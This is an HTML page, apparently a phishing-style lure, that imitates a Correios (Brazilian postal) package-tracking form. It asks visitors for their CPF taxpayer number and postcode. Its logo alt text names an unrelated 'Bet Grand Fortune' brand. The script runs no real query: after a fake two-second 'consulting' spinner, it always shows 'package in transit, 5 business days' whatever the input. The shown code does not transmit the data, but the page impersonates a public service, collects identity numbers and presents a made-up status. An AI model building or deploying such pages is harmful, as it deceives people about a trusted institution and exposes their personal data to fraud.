<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <title>Rastreamento Correios</title>
  <link rel="stylesheet" href="css/bootstrap.css" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f7fa;
      margin: 0;
      padding: 0;
    }

    /* Faixa amarela topo */
    #faixa-topo {
      background-color: #f7ca18;
      color: #003157;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: flex-end;
      padding: 0 1rem;
      font-weight: 600;
      font-size: 14px;
      position: relative;
    }

    #faixa-topo .acessibilidade {
      position: absolute;
      left: 1rem;
      cursor: pointer;
      font-weight: 600;
      user-select: none;
    }

    #faixa-topo .acessibilidade:hover {
      text-decoration: underline;
    }

    #faixa-topo .entrar {
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
    }

    #faixa-topo .entrar img {
      width: 18px;
      height: 18px;
    }

    #faixa-topo .menu {
      cursor: pointer;
      margin-left: 1.5rem;
      width: 25px;
      height: 20px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }

    #faixa-topo .menu span {
      display: block;
      height: 3px;
      background: #003157;
      border-radius: 2px;
    }

    /* Logo topo */
    #logo-topo {
      display: block;
      margin: 10px auto 30px auto;
      width: 180px;
      max-width: 90vw;
      object-fit: contain;
    }

    /* Janela formulário */
    #tela-formulario {
      background-color: #c9d6df;
      border-radius: 8px;
      max-width: 360px;
      width: 90%;
      margin: 0 auto 2rem auto;
      padding: 25px 20px 30px 20px;
      text-align: center;
      color: #003157;
      font-weight: 600;
      font-size: 16px;
      box-shadow: 0 0 8px rgb(0 0 0 / 0.1);
    }

    #tela-formulario .frase-centralizada {
      margin-bottom: 25px;
      white-space: pre-line; /* para respeitar quebras de linha \n */
      font-weight: 600;
      font-size: 16px;
      color: #003157;
    }

    form {
      text-align: center;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: 600;
      text-align: center;
    }

    input[type="text"] {
      width: 280px;
      max-width: 90vw;
      padding: 10px 0;
      font-size: 16px;
      text-align: center;
      border: 1px solid #003157;
      border-radius: 5px;
      margin: 0 auto 20px auto;
      display: block;
      background-color: white;
      box-sizing: border-box;
    }

    button#consultar-btn {
      width: 280px;
      max-width: 90vw;
      background-color: #003157;
      color: #f7ca18;
      border: none;
      padding: 12px 0;
      border-radius: 6px;
      font-weight: 700;
      font-size: 18px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      display: block;
      margin: 0 auto;
    }

    button#consultar-btn:hover {
      background-color: #002244;
    }

    /* Janela resultado */
    #tela-resultado {
      background-color: #c9d6df;
      border-radius: 8px;
      max-width: 360px;
      width: 90%;
      margin: 0 auto 2rem auto;
      padding: 25px 20px 30px 20px;
      text-align: left;
      color: #003157;
      box-shadow: 0 0 8px rgb(0 0 0 / 0.1);
      display: none;
      font-weight: 600;
    }

    /* Spinner */
    .spinner {
      margin: 10px auto;
      width: 35px;
      height: 35px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #003157;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }
  </style>
</head>

<body>
  <!-- Faixa topo amarela -->
  <div id="faixa-topo">
    <div class="acessibilidade" tabindex="0" role="button" aria-label="Acessibilidade">
      Acessibilidade
    </div>
    <div class="entrar" tabindex="0" role="button" aria-label="Entrar">
      <img src="entrar.svg" alt="Ícone Entrar" />
      Entrar
    </div>
    <div class="menu" tabindex="0" role="button" aria-label="Menu">
      <span></span>
      <span></span>
      <span></span>
    </div>
  </div>

  <!-- Logo topo -->
  <img src="logo.png" alt="Logo Bet Grand Fortune" id="logo-topo" />

  <!-- Tela formulário -->
  <section id="tela-formulario" aria-label="Formulário de rastreamento">
    <div class="frase-centralizada">
      Digite o CPF do comprador.
      <br />
      000.000.000-00
      <br /><br />
      Informe o seu CEP abaixo.
      <br />
      00000-000
    </div>

    <form id="form-rastreamento" autocomplete="off" novalidate>
      <label for="cpf">CPF</label>
      <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required inputmode="numeric"
        pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" aria-describedby="cpfHelp" />

      <label for="cep">CEP</label>
      <input type="text" id="cep" name="cep" placeholder="00000-000" maxlength="9" required inputmode="numeric"
        pattern="\d{5}-\d{3}" aria-describedby="cepHelp" />

      <button type="submit" id="consultar-btn">Consultar</button>

      <div id="loading-container" style="display: none; margin-top: 15px; text-align: center;">
        <p style="font-weight: 600; color: #003157;">Consultando seus dados...</p>
        <div class="spinner" role="status" aria-live="polite" aria-label="Carregando"></div>
      </div>
    </form>
  </section>

  <!-- Tela resultado -->
  <section id="tela-resultado" aria-live="polite" aria-label="Resultado da consulta">
    <h2>Dados da Encomenda</h2>
    <p><strong>CPF:</strong> <span id="resultado-cpf"></span></p>
    <p><strong>CEP:</strong> <span id="resultado-cep"></span></p>
    <p><strong>Status:</strong> Encomenda em trânsito</p>
    <p><strong>Previsão de entrega:</strong> 5 dias úteis</p>
  </section>

  <script>
    // Máscara simples para CPF
    function maskCPF(value) {
      return value
        .replace(/\D/g, '')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    }

    // Máscara simples para CEP
    function maskCEP(value) {
      return value
        .replace(/\D/g, '')
        .replace(/(\d{5})(\d)/, '$1-$2')
        .slice(0, 9);
    }

    document.getElementById('cpf').addEventListener('input', function (e) {
      e.target.value = maskCPF(e.target.value);
    });

    document.getElementById('cep').addEventListener('input', function (e) {
      e.target.value = maskCEP(e.target.value);
    });

    const form = document.getElementById('form-rastreamento');
    const loadingContainer = document.getElementById('loading-container');
    const resultadoSection = document.getElementById('tela-resultado');

    form.addEventListener('submit', function (e) {
      e.preventDefault();

      // Validação simples dos formatos
      const cpf = form.cpf.value.trim();
      const cep = form.cep.value.trim();

      if (!cpf.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
        alert('Por favor, insira um CPF válido no formato 000.000.000-00');
        form.cpf.focus();
        return;
      }

      if (!cep.match(/^\d{5}-\d{3}$/)) {
        alert('Por favor, insira um CEP válido no formato 00000-000');
        form.cep.focus();
        return;
      }

      // Mostrar loading e esconder resultado
      loadingContainer.style.display = 'block';
      resultadoSection.style.display = 'none';

      // Simular consulta (2s)
      setTimeout(() => {
        loadingContainer.style.display = 'none';
        resultadoSection.style.display = 'block';
        document.getElementById('resultado-cpf').textContent = cpf;
        document.getElementById('resultado-cep').textContent = cep;
      }, 2000);
    });
  </script>
</body>

</html>
